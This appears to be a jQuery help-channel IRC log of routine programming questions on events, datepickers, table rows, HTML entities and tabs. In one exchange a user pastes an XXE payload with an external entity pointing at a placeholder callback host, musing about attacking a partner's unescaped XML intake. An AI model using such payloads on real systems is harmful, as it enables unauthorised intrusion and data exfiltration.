[01:32:01] <shibly> I can't do one thing. When someone types in textbox then move to the next textbox by clicking the next textbox or by pressing tab, i need to get the value of the previous textbox. How can i do this?
[01:32:38] <Cork> shibly: check the .change event
[01:37:37] <shibly> Cork, change is not working , can you jsfiddle example?
[01:49:35] <shibly> http://jsfiddle.net/sked1fm4/1/ , .change is not working, can anyone answer?
[01:50:06] <shibly> Cork, ?^
[01:58:09] <Cork> shibly: https://jsfiddle.net/sked1fm4/2/
[02:01:16] <shibly> Suppose if i click one textbox, then without changing the texts , i click the other textbox, then an event will trigger, is there any event for this?
[02:01:39] <Cork> shibly: blur
[02:01:52] <Cork> but ya, as nothing was modified there isn't a change event
[02:03:42] <shibly> Cork, http://jsfiddle.net/6bLzzfsg/ , it doesn't work.
[02:04:19] <Cork> shibly: you haven't added jquery
[02:04:24] <Cork> https://jsfiddle.net/6bLzzfsg/1/
[02:06:37] <shibly> Cork, Added jquery, but doesn't work. http://jsfiddle.net/6bLzzfsg/3/
[02:06:49] <Cork> i mean i added it to /1/
[02:06:52] <Cork> and it worked just fine
[02:07:40] <Cork> shibly: though if you mean clicking in #other should trigger it
[02:07:42] <Cork> then it won't
[02:07:48] <Cork> cause #other can't have focus
[02:08:02] <Cork> but ya, the focus will change to document
[02:08:06] <Cork> so the event will still fire
[02:09:32] <shibly> https://jsfiddle.net/6bLzzfsg/4/ , i didn't add jquery, but it looks it's working
[02:09:36] <shibly> Why?
[02:09:57] <Cork> cause like i said i added jquery in /1/
[02:10:07] <Cork> click the "javascript" header in the window
[02:12:04] <shibly> If i click anywhere but textbox, blur event is fired, why?
[02:12:21] <shibly> s/textbox/textbox1
[02:12:26] <Cork> read my comment a little while back
[02:12:42] <Cork> blur fires when the field loses focus
[02:13:01] <shibly> So that is not good
[02:13:13] <Cork> it is what you have to work with
[02:13:21] <shibly> I need the event only when i will click the textbox2
[02:13:23] <Cork> you will have to filter out the case you want
[02:13:30] <Cork> there are no such event
[02:14:03] <shibly> It will fire when i will click other input
[02:14:29] <shibly> Do i have to create my own event?
[02:14:34] <Cork> no
[02:28:24] <Tuck_> Hey i was wondering if anyone knew how to make a picture wrap around offscreen so to speak. So the picture will slide off to the left and appear back on the right side of the screen. I've made a shitty diagram to try and explain better http://i.imgur.com/8qrPV7b.png
[02:29:25] <Cork> Tuck_: you would have to have two images
[02:29:40] <Cork> and put it before/after the current one depending on slide direction
[02:30:09] <Tuck_> Alright thanks ill have a go at it
[03:06:54] <hellyeah> morning
[03:07:48] <hellyeah> you can add element with add button as much as you want but for example i cannot click second element input part. How can i fix that? https://jsfiddle.net/qLokkyfx/7/
[03:12:17] <xec> hellyeah: what do you mean by "second element input part"?
[03:13:08] <hellyeah> hmm sorry for my english
[03:13:27] <hellyeah> you click "add" button and you see exact same element one line below
[03:13:41] <hellyeah> try to click on of the input box it doesnt respond your click
[03:15:03] <xec> i see
[03:15:23] <xec> well, you could initialize the datepicker after a row is created
[03:17:41] <hellyeah> did you mean that https://jsfiddle.net/qLokkyfx/8/
[03:18:15] <hellyeah> no luck
[03:20:16] <hellyeah> i need help :XD
[03:20:20] <xec> i dont see what the difference is there
[03:20:48] <hellyeah> sorry line 18-19 https://jsfiddle.net/qLokkyfx/10/
[03:22:50] <xec> hellyeah: https://jsfiddle.net/qLokkyfx/11/
[03:23:20] <xec> hellyeah: here i've used a template to store a row, makes it a bit easier to work with
[03:24:52] <hellyeah> is this right <script id="myTemplate" type="text/html">
[03:24:55] <xec> hellyeah: the important part as far as your issue goes, is that i call .datepicker() *after* i create the new elements
[03:25:05] <hellyeah> are you using this if content is static?
[03:25:16] <hellyeah> what is the standard of using template?
[03:25:36] <xec> that is the current standard way of using templates, as <template> isn't that well supported yet
[03:26:18] <xec> <script> tags with that mime type won't execute as javascript, but will hide contents by default, so its a neat trick
[03:27:14] <hellyeah> ic
[03:27:21] <hellyeah> so use script instead of tags
[03:27:25] <hellyeah> i will search for it
[03:28:32] <xec> hellyeah: this is a rather old post (2008) but it might explain it to you http://ejohn.org/blog/javascript-micro-templating/
[03:29:22] <hellyeah> thank you
[03:29:31] <hellyeah> but now there is one more problem
[03:29:45] <hellyeah> try to change the value of input box after adding
[03:29:51] <hellyeah> it will change the value of first
[03:29:52] <hellyeah> :XD
[03:31:02] <hellyeah> i will read the link
[03:31:10] <hellyeah> https://jsfiddle.net/qLokkyfx/11/
[03:32:32] <xec> https://jsfiddle.net/qLokkyfx/12/
[03:33:41] <hellyeah> find the new row
[03:33:42] <hellyeah> hmm
[03:35:35] <hellyeah> brb,
[03:36:21] <xec> hellyeah: i don't find a new row, newRow is a reference to the row we created. we need to make sure to only touch the children inside it rather than selecting using the global $("#for")
[03:36:50] <xec> you also can't use any given ID more than once on a page, so i removed the IDs
[03:40:06] <Kartagis> console.log(!$("#profiles").css("display","none")) <--- what does it mean when this returns false?
[03:40:18] <Kartagis> the div is hidden
[03:40:46] <slax0r> that it returned true
[03:40:48] <Cork> Kartagis: that the return value from .css isn't truety
[03:40:52] <xec> you're setting the css to display none and then negating the set (doesn't make sense)
[03:41:05] <Cork> sorry, that it IS truety
[03:41:17] <xec> you could read the vale first and then chech
[03:41:19] <xec> check*
[03:41:22] <Kartagis> what if I want to say "if the div is hidden)
[03:41:23] <Cork> Kartagis: most likely it just means it returns a jquery object
[03:41:28] <Kartagis> what if I want to say "if the div is hidden"?
[03:41:43] <Cork> Kartagis: .is(1':hidden')
[03:41:48] <Cork> Kartagis: * .is(':hidden')
[03:41:58] <Kartagis> oh
[03:42:14] <xec> Do what cork said. If you wanted to read the value of the css you could do if ($(element).css("display") === "none") or something like that
[03:46:39] <Kartagis> I'm hiding the div, then doing if ($("#profiles").is("hidden")) { $("#profiles").css("display","block");} but it's not working. am I missing something?
[03:47:06] <Cork> Kartagis: i would recommend using .show/.hide instead
[03:47:40] <Cork> also, you could just do $("#profiles").show()
[03:47:46] <Cork> the if case isn't needed
[03:47:49] <Kartagis> Cork: .show sets display to inline, and that is not a nice thing for me
[03:47:55] <Cork> it is a noop if it is visible anyway
[03:48:07] <Cork> Kartagis: it sets it to inline if you've hidden the element the wrong way
[03:48:10] <xec> what kind of element is #profiles?
[03:48:16] <Kartagis> div
[03:48:28] <xec> is there something in the css that says it should be inline?
[03:48:29] <Cork> Kartagis: then you have display: inline; in your css for the element
[03:48:49] <Kartagis> xec: nope
[03:48:54] <Cork> Kartagis: you have to
[03:49:05] <xec> Kartagis: don't believe you ;) can you make a demo?
[03:49:24] <Cork> Kartagis: if there isn't a display for the element in the css
[03:49:31] <Cork> jquery will default to the element type default
[03:49:35] <Cork> for div that would be block
[03:50:16] <Cork> Kartagis: set css('display', '') and check what the browser shows in the active rules
[03:50:31] <Kartagis> Cork: how about if the element is a button?
[03:50:40] <Kartagis> would it be inline?
[03:50:44] <xec> <button> is inline by default yes
[03:50:46] <Cork> then it would be inline, unless you set it to be something else
[03:50:52] <Kartagis> uhm
[03:50:57] <Cork> Kartagis: the correct way to do this is to set display: block in the css
[03:50:58] <Kartagis> that's why
[03:51:04] <Cork> and then run .hide() on page load
[03:51:21] <Cork> Kartagis: an alternative solution is to use classes
[03:51:28] <Cork> (my preferred solution)
[03:52:38] <xec> you could just do #profiles { display: block; } if you only care about that one
[03:53:02] <Cork> and then add a #profile.collapsed { display: none; }
[03:53:21] <Cork> and $('#profile').toggleClass('collapsed', true/false)
[03:55:38] <xec> bbl
[04:43:20] <UniFreak> is there a channel I can ask questions about `jquery-validation`?
[05:17:13] <Cork> UniFreak: this would be that channel
[06:05:21] <brk> I am a bit clueless to why the following returns an error saying change is not a function: $('[id=dayselect]')[index].change(setFieldValueFromSelects); Any ideas or hint to what I should look into?
[06:06:45] <Kartagis> is it possible to turn off scrolling up given the pageYOffset value?
[06:52:49] <hellyeah> do you know input text  has an attr on html for checking null or not or should i do that in jquery or javascript
[07:08:28] <Uhkis> brk: 1) that selector makes no sense, use #dayselect 2) [index] ?? what's the point of this
[07:09:50] <Uhkis> hellyeah: <input required="true">
[07:10:24] <Uhkis> hellyeah: https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input#attr-required
[07:11:33] <brk> I use $('[id=dayselect]')[index] because there's more than one with that id.
[07:11:41] <brk> And no, I didn't make it.
[07:13:44] <Uhkis> so you cannot fix that broken html?
[07:17:02] <hellyeah> Uhkis: dunno why but required not working in this case? Can you take a look https://jsfiddle.net/qLokkyfx/17/
[07:39:28] <PLG> Hi all
[07:40:24] <sigdk> hello PLG
[07:40:28] <PLG> Using jquery ,my record is added as 3,2,1 but i want to add in 1,2,3 order
[07:40:55] <PLG> How can i do that ?any idea
[07:42:17] <PLG> plese give any suggestion
[07:42:23] <sigdk> what record ?
[07:42:36] <PLG> Using jquery ,my record is added as 3,2,1 but i want to add in 1,2,3 order
[07:42:41] <PLG> in table
[07:43:25] <sigdk> I'm very noob with jquery but if there is some code I can give it a shot
[07:43:38] <PLG> I jwant to add record just after the last record added
[07:46:46] <sigdk> PLG, do you have any code to show ?
[07:46:56] <PLG> yes
[07:47:03] <daslicht> create a jsfiddle
[07:47:14] <daslicht> or jsbin or anything else
[07:51:42] <sigdk> Btw, here is what I do more or less at my project: http://jsfiddle.net/ojktxk0n/16/  Here it seems to work fine. Nevertheless, at my project the populateTabONE() does not get called when the page first loads. I need to click on 2nd tab and then again to the 1st to see the data loaded. Any idea why ?
[07:54:18] <Cork> PLG: .sort() should do what you want, though ya code would help
[07:55:01] <Cork> sigdk: line 20 isn't valid
[07:55:59] <PLG> https://jsfiddle.net/wr9auxxt/1/
[07:56:06] <PLG> Please check
[07:56:36] <PLG> this add record 1..3,2
[07:56:43] <PLG> in order
[07:56:57] <PLG> 1...5,4,3,2
[07:57:01] <Cork> PLG: take the tbody element instead of #rowCount
[07:57:08] <Cork> and use .append instead .after
[07:57:22] <PLG> i used ,but dont work
[07:57:23] <Cork> that should solve your problem
[07:57:42] <Cork> could you make a test case with the relevant parts?
[07:57:48] <Cork> you have a tr without any context
[07:58:18] <PLG> I add record in a table at record having id="rowCount"
[07:58:43] <Cork> PLG: the solution i have you works
[07:58:56] <PLG> ok tell
[07:58:56] <Cork> as you don't get that working i need to be able to show you
[07:59:04] <PLG> please
[07:59:08] <Cork> i can't do that without a picture of how the table look
[07:59:14] <daslicht> your fiddle just shows : }//]]>
[07:59:15] <Cork> so i need more then a single tr
[07:59:27] <Cork> daslicht: just remove the <script> in the javascript section
[07:59:43] <daslicht> ahh
[07:59:59] <daslicht> still no resuult
[08:00:00] <daslicht> :)
[08:00:10] <Cork> ya, cause the html section isn't valid
[08:00:23] <PLG> https://jsfiddle.net/wr9auxxt/2/
[08:00:30] <daslicht> hm js fiddle updated , where tyo add jquerty ?
[08:00:31] <PLG> please check
[08:00:45] <PLG> in head
[08:00:54] <Cork> PLG: uh... it can't have server code in it...
[08:01:08] <PLG> means
[08:01:17] <daslicht> @foreach ($errors->all() as $error)
[08:01:22] <daslicht> is serverside rendered
[08:01:32] <Cork> daslicht: click the javascript title in the section
[08:01:33] <daslicht> that wont work in jsfiddle
[08:01:44] <PLG> ok forget that
[08:02:00] <PLG> please remove that part
[08:02:23] <daslicht> @Cork: Lovely !
[08:02:35] <daslicht> PLG please post shorter code
[08:02:47] <PLG> ok
[08:02:57] <Cork> post relevant code
[08:03:06] <Cork> shorter isn't always better
[08:03:11] <daslicht> agree
[08:03:12] <Cork> but it should be relevant for the question
[08:04:35] <PLG> https://jsfiddle.net/wr9auxxt/5/
[08:04:41] <PLG> please check
[08:05:05] <PLG> i just want to add record just after 1
[08:05:21] <sigdk> Cork, indeed
[08:05:27] <sigdk> when I click "run" at jsfiddle, does it reload the page ?
[08:05:40] <Cork> it does
[08:07:00] <PLG> any solution
[08:07:31] <Cork> uggg
[08:07:40] <Cork> PLG: you really shouldn't use event attributes
[08:07:53] <Cork> it makes the code hard to read, and cause all kind of other problems
[08:08:18] <Cork> uh..
[08:08:25] <Cork> this.form... on a span?!?
[08:10:30] <sigdk> Cork, well, this version works when I click run, but not when I click reload: http://jsfiddle.net/ojktxk0n/18/
[08:11:06] <sigdk> hmm... my mistake. works on both
[08:11:13] <daslicht> @PLG: https://jsfiddle.net/m698n7jj/1/embedded/result/
[08:13:53] <Cork> PLG: https://jsfiddle.net/wr9auxxt/8/
[08:14:00] <Cork> that is the solution i would recommend
[08:14:37] <Cork> sigdk: you have script in the html section
[08:15:28] <Cork> sigdk: and https://jsfiddle.net/ojktxk0n/19/ works the same with run and reload for me
[08:15:33] <sigdk> Cork,  Is that bad ? When does this part get executed ?
[08:15:42] <PLG> i want to add record after a particuler record id not at last record of table
[08:15:49] <Cork> sigdk: you shouldn't have js in the html section
[08:15:55] <Cork> that is what the js section is for
[08:16:20] <Cork> PLG: well then you can't do it like that
[08:16:31] <Cork> PLG: you would have to find the next element and use .before
[08:16:36] <Cork> else you will invert the order
[08:16:41] <PLG> please tell me how to do that
[08:16:58] <Cork> uh... i just did
[08:17:04] <PLG> give me one example
[08:17:18] <Cork> uh $('next row').before(newRow)
[08:17:37] <sigdk> Cork, please, let me understand this. When does everything get executed ?  This: $(function() { ... } runs before this:  $(document).ready(function() { ... }  right ?
[08:17:39] <Cork> where 'next row' is the selector for the next row you want to have below the new row
[08:17:50] <Cork> sigdk: no
[08:17:58] <Cork> those two are the exact same
[08:18:04] <Cork> one is a short hand for the other
[08:18:20] <PLG> I have to generate id of the record dynamically
[08:18:44] <Cork> PLG: i can't tell there isn't any other rows to take reference to
[08:19:00] <Cork> but if you have countRow as element 0
[08:19:07] <Cork> and add all elements directly after it
[08:19:12] <Cork> you will get 0,5,4,3,2,1
[08:19:24] <Cork> only way to avoid that is to add it before the next element
[08:19:44] <Cork> so you get 0,1,2,3,4,5,next-row
[08:20:00] <PLG> i have a record and at last of the record there is a button to add new record,the added new record will have delete button to delete record
[08:20:31] <hellyeah> hey
[08:20:44] <hellyeah> can you take a look at line 48 and line 49
[08:21:08] <sigdk> Cork, I guess there should be some order between them... no ?  The event to populate the tab should be specified before I set the active tab... (?)
[08:21:20] <hellyeah> i suppose i could take second input box with eq(1) but it doesnt work like that can you help me to figure out that https://jsfiddle.net/qLokkyfx/19/
[08:21:53] <Cork> sigdk: no, $(function(){}) is litteraly just a translation into $(document).ready(function() {})
[08:22:37] <daslicht> PLG: did you see my example ? it is exactly showing how to do this
[08:23:16] <Cork> sigdk: https://github.com/jquery/jquery/blob/master/src/core/init.js#L108
[08:23:21] <Cork> that is exaclty what happens
[08:23:21] <PLG> i just want to add record after <tr id="p"> and all the records must be added there after
[08:23:27] <daslicht> PLG: after a specific id ?
[08:23:33] <PLG> yes
[08:23:35] <daslicht> so you want to insert a row ?
[08:23:37] <PLG> https://jsfiddle.net/m698n7jj/4/
[08:23:42] <PLG> please check
[08:24:14] <daslicht> please explain
[08:24:15] <Cork> daslicht: he wants to do currentRow.after_all_the_elements_i_ve_added_here_before()
[08:24:22] <Cork> and that doesn't exist
[08:25:40] <PLG> i want to add record after tr that have id="p" and new record will be added after  <tr id="p"></tr>
[08:26:12] <Cork> PLG: except you want them to be 1,2,3,4,5 not 5,4,3,2,1
[08:26:22] <Cork> so that means you want to ad do #p + the elements already added
[08:26:30] <PLG> but all record are added just after <tr id="p"></tr> but want to add just after new record added
[08:26:38] <PLG> yes
[08:26:49] <PLG> Cork: you are true
[08:27:02] <Cork> PLG: what you want isn't possible
[08:27:11] <Cork> so what you need to do is referencing the next row
[08:27:12] <daslicht> http://api.jquery.com/insertafter/
[08:27:15] <daslicht> what about this?
[08:27:17] <Cork> no
[08:27:32] <Cork> daslicht: that is just the reverse of $(target).after(newrow)
[08:27:42] <Cork> daslicht: that is just the reverse of $(newrow).insertAfter(target)
[08:28:16] <Cork> daslicht: if you take an id and add something related to that element
[08:28:22] <Cork> it will be added related to that element
[08:28:32] <Cork> not related to another element you added related to that element
[08:28:38] <Cork> THAT is the problem here
[08:28:43] <PLG> yes daslicht
[08:28:52] <Cork> if you take the next original row
[08:28:57] <Cork> and add it before that one
[08:29:07] <Cork> you will always point at the correct position
[08:29:11] <PLG> please give me one example of my problem
[08:31:30] <daslicht> https://jsfiddle.net/daslicht/m698n7jj/6/ ?
[08:31:49] <sigdk> Cork, Why this https://jsfiddle.net/ojktxk0n/20/ or this https://jsfiddle.net/ojktxk0n/21/ aren't equivalent to the one you sent ?
[08:31:51] <daslicht> this inserts a row after the item with the id 1
[08:33:07] <sigdk> Cork, I tried to "merge" the $("#tabs") code
[08:37:09] <PLG> Yes daslicht you solved my problem..Thanks all
[08:37:19] <daslicht> :D
[08:37:28] <daslicht> It was a pleasure
[08:38:05] <PLG> THANKS
[08:38:16] <daslicht> :D
[08:58:04] <nru> hi
[08:58:29] <nru> if i post data like car1&car2 how can i post this data as car1&amp; so & as &amp;
[08:59:42] <Cork> nru: create an element add the text and grab the html
[08:59:53] <Cork> so $('<div>').text(oldText).html()
[09:00:49] <Cork> nru: though this sounds like something the server should handle not js
[09:01:11] <nru> the receiving end party tells me its best practise to send & as &amp;
[09:01:17] <nru> as post
[09:01:20] <Cork> uh
[09:01:22] <Cork> no
[09:01:28] <Cork> &amp; is html
[09:01:31] <Cork> it has nothing to do with post
[09:01:45] <Cork> escaping & to &amp; is done when you render things in an html page
[09:03:21] <nru> so &amp; is html and has nothing to do with the post body which is just unicode text
[09:03:25] <nru> is that correcT?
[09:03:40] <Cork> nru: &amp; is explicitly "html entity"
[09:03:54] <Cork> & is escaped to &amp; cause & in it self is an escape character
[09:04:25] <Cork> nru: http://dev.w3.org/html5/html-author/charref
[09:05:26] <nru> & is an escape character, could you please explain a bit Cork would be nice :)
[09:05:40] <Cork> nru: ig you check the link i just posted
[09:05:51] <Cork> what does all the encoded strings have in common?
[09:06:01] <Cork> (tip the start with & and end with ;)
[09:06:25] <nru> hmmm i dont get it :(
[09:06:26] <Cork> so & is an indication that what follows is an html entity
[09:06:38] <Cork> that is normally referred to as an escape character
[09:06:52] <Cork> \ is a common one in other languages
[09:06:58] <Cork> ex. \\ and \n and \"
[09:07:09] <Cork> & is the same thing, but for html
[09:07:36] <nru> yes but why would it not be OK if & is posted as &amp; in the body
[09:07:38] <nru> post body
[09:08:05] <Cork> nru: it might be ok, but it means the other party expects to get html, not text
[09:08:19] <Cork> cause &amp; is not text, it is html
[09:09:19] <Cork> nru: what i responded to was the "best practice" cause that is outer bullshit
[09:09:30] <nru> yes is it also unsafe to send html code?
[09:09:32] <nru> like &amp;
[09:09:41] <nru> BRB m8 :)
[09:10:07] <Cork> well if the reserving party is handling there data correctly it is safe, but you will have &amp; in your content and not &
[09:10:30] <Cork> if the reserving is NOT ensuring the content is safe, then &amp; is a must
[09:10:50] <Cork> for pure text strings that is
[09:11:04] <Cork> if they expect html that is a completely different matter
[09:12:07] <Cork> nru: so what this means the server expects html encoded entities and not plain text; as long as that is the case then it; ok i guess...
[09:20:36] <nru> Cork
[09:20:54] <nru> with 'the server expects html encoded entities and not plain text'
[09:21:09] <nru> html encoded entities you mean sending & really as &amp; right
[09:21:41] <Cork> nru: if the text needs to be encoded as html entities
[09:21:50] <Cork> the server expects html encoded entities not text
[09:22:03] <Cork> the name kinda implies the answer to that one...
[09:22:24] <nru> their server is a .net server
[09:22:28] <nru> which just receives my POST data
[09:22:36] <nru> they convert my HTML to XML
[09:22:41] <Cork> nru: it isn't about the framework it is written in
[09:22:56] <Cork> it is about what the code handling the data comming in expects
[09:23:23] <nru> im confused
[09:23:36] <Cork> nru: when you write code for a server
[09:23:50] <Cork> if you don't encode text before you either put it in the database or grab it from there
[09:24:02] <Cork> it needs to be encoded before it is sent to it
[09:24:18] <Cork> hence it expects html entities
[09:24:46] <Cork> if the code handling the data comming in, does the html escaping before it is put into the database or before it is rendered
[09:24:59] <Cork> it expects plain text to come in (else it will double escape it)
[09:25:28] <Cork> the later is the normal case, unless when the server expects html (like many cms system does)
[09:26:04] <nru> soooo...
[09:26:05] <Guest61765> Can I do my code better/less ---> https://jsfiddle.net/hvmsu3qg/
[09:26:16] <Cork> ugg... yes
[09:26:20] <nru> haa
[09:26:23] <nru> haha
[09:26:29] <Cork> Guest61765: use classes not ids
[09:26:34] <Cork> and you could remove all the duplicate code
[09:26:53] <Cork> Guest61765: also don't put tag names infront of your ids
[09:27:08] <nru> if i send an &amp; by post then it just sends &
[09:27:17] <nru> they will receive it as text : &
[09:27:32] <Cork> nru: no, that isn't correct
[09:27:55] <Guest61765> Cork: done ---> https://jsfiddle.net/hvmsu3qg/1/
[09:28:21] <Cork> if you send &amp; what you will send is %26amp%3B
[09:28:34] <Cork> the server will then decode that to &amp; on there end
[09:28:45] <Cork> if you send & it will be sent as %26
[09:28:47] <nru> hmm
[09:28:54] <Cork> (that is called url encoding)
[09:29:25] <jbc8_> why would a $('#form').submit() fail?
[09:29:28] <nru> currently i just post this & they change it to xml and in xml they get a parse error at the & telling its not encoded
[09:29:42] <Cork> jbc8_: the selector might not match?
[09:29:50] <jbc8_> the selector is correct
[09:30:49] <jbc8_> i was wondering if warnings/errors would prevent a form from submitting using Jquery
[09:33:08] <Cork> Guest61765: https://jsfiddle.net/hvmsu3qg/2/
[09:33:46] <Cork> jbc8_: errors from the form spec, then yes
[09:33:55] <Cork> else, no not in vanilla jquery
[09:34:07] <jbc8_> Cork: do you have a link to the form spec?
[09:34:08] <Guest61765> Cork: thx! =) thats a lot less code
[09:34:25] <Cork> nru: ya, that means they just put what ever you gave them into the xml view without escaping the content
[09:34:39] <nru> so that means i can also do an xxe attack
[09:34:56] <Cork> nru: not in xml, as it normally doesn't support scripting
[09:35:05] <Cork> nru: but ya, that is the basic concept
[09:35:10] <Cork> if it was html and not xml
[09:35:16] <nru> <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://yoursite.com/some.callback.php" >]><foo>&xxe;</foo>
[09:36:03] <Cork> nru: depends on the parser of the xml, but ya
[09:38:20] <nru> cork very much thanks
[09:38:29] <nru> i will tell the guys to fix their parsing and encoding
[09:38:55] <nru> is there also any RFC part in a document which you might now which let them see that best practise and standard is sending & as &
[09:39:23] <Cork> nru: it isn't so much about good/bad practise

[10:01:56] <CMFDesign> Hey all. I am trying to develop a site where users can create their top 11 football team to be printed in a frame. They want to see a visual of the shirts and then be able to use a colour wheel to pick any colour. How could I do this? I thought maybe use a transparent shirt, then have the colour picked from a wheel. However, its changing the background of the whole div, not just the shirt. I'm stuck with ideas, anyone else have any good i
[10:01:56] <CMFDesign> deas?
[10:01:59] <sigdk> in the second case, I've pulled some of the code for #tabs to a separate block
[10:04:47] <sigdk> Cork, any help please ?
[10:18:07] <nru> Cork
[10:19:05] <nru> you still there
[10:19:12] <Cork> sigdk: what part isn't the same?
[10:19:15] <Cork> what is breaking?
[10:19:50] <nru> Cork the guys im discussing they tell me that on my site i also retrieve an xml file from another webpage, if i get their xml i see this in their element: Description>GRIF POLYMAX F&amp;S EXPR CC 300G</Description>
[10:20:04] <nru> those guys tell me, look even they send it encoded
[10:20:15] <sigdk> Cork, nothing brakes. at 29 you see the msg printed when the page loads, on the other not. Nevertheless the code (I think) is semantically the same
[10:20:19] <Cork> nru: are you sending xml to them?
[10:20:31] <Cork> cause if you are, then ya, encoding is needed
[10:20:31] <nru> nope
[10:20:44] <Cork> then what is in the resulting xml means nothing
[10:21:06] <Cork> that is just the server escaping things for the format it sends the data in
[10:22:23] <Cork> sigdk: your staring at the wrong place :) https://jsfiddle.net/ojktxk0n/30/
[10:22:32] <Cork> it isn't the $() causing this
[10:22:47] <Cork> it is that in one you initialize to 1, and the other you change it after initializing it
[10:24:39] <sigdk> Cork, it's different options. The one initializes the tab, the other sets up a function call... I thought they 're completely different things and can be in the same block
[10:25:13] <sigdk> Cork, have also a look at this: https://jsfiddle.net/ojktxk0n/31/   when I set active to 0, I don't get any msg printed
[10:26:52] <Cork> sigdk: https://jsfiddle.net/ojktxk0n/33/
[10:27:03] <Cork> cause it is already initializing to 0, so nothing changes
[10:27:24] <Cork> sigdk: what you give to the first call to tabs isn't activating the tab
[10:27:33] <Cork> it is what "is already active"
[10:27:54] <sigdk> Cork, this looks like a hack
[10:28:07] <sigdk> I can set the initial active tab
[10:28:07] <Cork> sigdk: it was meant to explain what happens
[10:28:37] <Cork> the point is that activate isn't meant to be used for what you think it is
[10:28:38] <sigdk> now you tell me, the initial tab is always 0... but you can change to something else right after
[10:28:41] <sigdk> am I right ?
[10:28:56] <Cork> sigdk: not really
[10:29:09] <Cork> sigdk: my point was that if you don't set the active tab in the initialize options
[10:29:12] <Cork> it will default to 0
[10:29:24] <sigdk> but no event triggered
[10:29:27] <Cork> and if it is already 0, setting it to 0 is no change
[10:29:33] <Cork> sigdk: as it isn't a change ya
[10:29:56] <Cork> like i said, what you set in the initialize options is what is the current state, not a "do this when you initialize"
[10:30:05] <sigdk> yeah... sounds me like a bad design. The behavior should be the same among tabs
[10:30:20] <Cork> sigdk: it is the same
[10:30:28] <Cork> what tab you set doesn't matter
[10:33:35] <Cork> sigdk: this is prob what you're looking for https://jsfiddle.net/ojktxk0n/34/

[12:05:52] <rfr> Hello All, I am trying to send a variable to my Dancer2 route with $.post('paymentform', { token: Gtoken }) The route is getting called but the variable is not coming across. I have varified the value just before the call with alert(Gtoken);
[12:06:51] <robertmaxrees> what does your network tab say?
[12:07:44] <erwin_> <arc_>: hey arc_
[12:07:50] <erwin_> how are you doingman
[12:07:52] <erwin_> doing man
[12:08:24] <rfr> robertmaxrees: Not sure let me see if I can check. Is that in the developer console?
[12:08:53] <robertmaxrees> it's in the dev tools, yes rfr
[12:09:53] <rfr> Okay, checking...
[12:21:14] <rfr> robertmaxrees: Thank you! that clued me into what I was doing wrong by showing me that the token was being sent by the paramater name 'token' of token and NOT as 'Gtoken' which was how I was trying to collect it on the server side.  Thank you again!
[12:21:38] <robertmaxrees> rfr :) glad you figured it out.
[12:45:27] <docmur_> I have a some jquery code, which posts to a PHP file which generates a table, this table is then put into a div.  the problem is, once I echo the data into the div, style="display: none;" is set:  http://jsfiddle.net/bLdwLk53/2/  How do I stop that from being activated?  I want to see the table
[12:48:43] <robertmaxrees> your php's probably echoing it wrong.
[12:48:53] <robertmaxrees> jquery/javascript aren't automagically hiding that for you.
[12:57:03] <docmur_> okay.. well I'm just using a standard loop with a echo statement, I've used it a 100 times before, never failed before
[12:57:30] <robertmaxrees> then you need to show more code :) how could i possibly help you if you're only showing me the broken output?
[12:57:33] <robertmaxrees> show the js.
[13:02:34] <docmur_> This is exactly what I'm doing http://jsfiddle.net/bLdwLk53/3/
[13:04:40] <robertmaxrees> you aren't repeating that ID or anything like that, right?
[13:04:59] <docmur_> Nope, the $result object is drawn from a MySQL Table
[13:05:37] <robertmaxrees> err...
[13:05:45] <robertmaxrees> that has nothing to do with what I asked, but ok.
[13:05:54] <robertmaxrees> looks like something else is causing your headache, either way,.
[13:06:04] <docmur_> Fair enough, yopu're right, all the ID's are differnet
[13:06:35] <docmur_> Is there a way to use jQuery to unset that display: none?
[13:06:41] <docmur_> when I change it in the browser, it's fine
[13:06:59] <robertmaxrees> the .show() should do that for you just fine.
[13:07:37] <robertmaxrees> but i'd figure out what's setting display: none;
[13:08:11] <docmur_> That's what I'm trying to do :S, I figured jQuery was setting it because jQuery was calling and recieving from my php file
[13:08:15] <docmur_> but it's not, fair enough
[13:08:28] <robertmaxrees> nope.  jquery doesn't do things you don't tell it to do.
[13:08:56] <robertmaxrees> i'd check to see if you have any global ajax event handlers or anything like that set up.
[13:09:08] <robertmaxrees> maybe grep your codebase for that ID
[13:09:55] <docmur_> Good idea
[13:11:45] <docmur_> changing the ID of loadDiv worked, I guess Firefox / Chrome cached the ID from earlier
[13:11:48] <docmur_> thanks for the idea
[13:12:15] <robertmaxrees> sounds like you have JS that's hiding that if it's setting that style inline.
[13:14:26] <z1haze> can anyone explain to me why this http://dpaste.com/0399PAA returns a date thats the year 3500
[13:16:43] <robertmaxrees> z1haze check the docs.
[13:23:46] <stan_man_can_> Is there any way to see if all instances of .expandable also has the class .expanded?
[13:24:26] <robertmaxrees> sure - .filter() is one way.
[13:24:36] <robertmaxrees> it's like the swiss army knife of questions like that.
[13:24:50] <stan_man_can_> Hmm
[13:25:13] <robertmaxrees> there's also .is()
[13:25:15] <stan_man_can_> I just actually realized I could probably do if($(".expandable").length = $(".expanded").length())
[13:25:25] <robertmaxrees> that's a bad idea.
[13:25:29] <taplar> could be different elements
[13:25:35] <robertmaxrees> ^
[13:25:46] <robertmaxrees> use http://api.jquery.com/is/
[13:25:54] <stan_man_can_> if($(".expandable").length = $(".expandable.expanded").length()) ??
[13:26:02] <robertmaxrees> don't do that, either.
[13:26:04] <robertmaxrees> use .is()
[13:26:05] <stan_man_can_> i'll take a look thanks robertmaxrees
[13:26:21] <taplar> and regardless, it's == or === for comparison
[13:26:26] <stan_man_can_> robertmaxrees: wouldn't I have to loop through them all with .is ?
[13:26:52] <robertmaxrees> woops, yeah it only tests of one of them matches.
[13:26:55] <robertmaxrees> use .filter() then.
[13:27:00] <stan_man_can_> taplar: yeah I know my bad that was a pretty embarrassing miss
[13:27:05] <taplar> stan_man_can_: do you want to know if they have both, or do you only want those that have both?
[13:27:47] <robertmaxrees> var foo = $('.expandable').filter(function() { return $(this).hasClass('expanded') }).length;
[13:28:03] <stan_man_can_> taplar: I have a bunch of divs with class expandable, and they will also have either expanded or collapsed
[13:28:24] <stan_man_can_> but I have an expand/collapse all button that I want to update if someone opens/closes each of them individually
[13:28:40] <robertmaxrees> stan_man_can_ then explan them all.
[13:28:50] <robertmaxrees> *expand - don't double check first.
[13:29:02] <stan_man_can_> robertmaxrees: it's the text of the button
[13:29:08] <stan_man_can_> it  toggles between "Expand All" and "Collapse All"
[13:29:15] <robertmaxrees> that's confusing.
